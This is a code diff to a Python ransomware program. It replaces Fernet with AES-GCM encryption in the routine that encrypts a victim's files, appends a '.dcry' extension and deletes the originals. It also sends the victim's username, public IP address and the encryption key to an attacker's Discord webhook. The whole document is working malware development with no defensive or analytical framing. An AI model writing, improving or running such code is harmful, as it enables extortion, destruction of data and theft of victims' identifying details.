@@ -1,7 +1,6 @@
 import base64
 import ctypes
 import hashlib
-import random
 import os
 import string
 import subprocess
@@ -13,7 +12,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import winshell
-from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from discord_webhook import DiscordEmbed, DiscordWebhook
 from win32com.client import Dispatch
 
@@ -305,10 +304,10 @@ def block_processes():
 
 def start_encryption():
     webhook = DiscordWebhook(url=YOUR_WEBHOOK_URL)
-    key = Fernet.generate_key()
+    key = os.urandom(16)
     embed = DiscordEmbed(
         title=f"Username :{os.getlogin()} | Ip: {get_public_ip()} | Date: {datetime.now().strftime("%d-%m-%Y")}",
-        description=f"Key: {key.decode()}",
+        description=f"Key: {base64.urlsafe_b64encode(key)}",
     )
     webhook.add_embed(embed)
     webhook.execute()
@@ -335,12 +334,13 @@ def encrypt_file(path, key, chunk_size=268435456):
     try:
         MAGIC = b"DCRY$"
         encrypted_path = path + ".dcry"
-        cipher = Fernet(key)
+        cipher = AESGCM(key)
         with open(path, "rb") as f_in, open(encrypted_path, "wb") as f_out:
             f_out.write(MAGIC)
             while chunk := f_in.read(chunk_size):
-                encrypted_chunk = cipher.encrypt(chunk)
-                f_out.write(encrypted_chunk)
+                nonce = os.urandom(12)
+                encrypted_chunk = cipher.encrypt(nonce, chunk, None)
+                f_out.write(nonce + encrypted_chunk)
         os.remove(path)
     except:
         pass
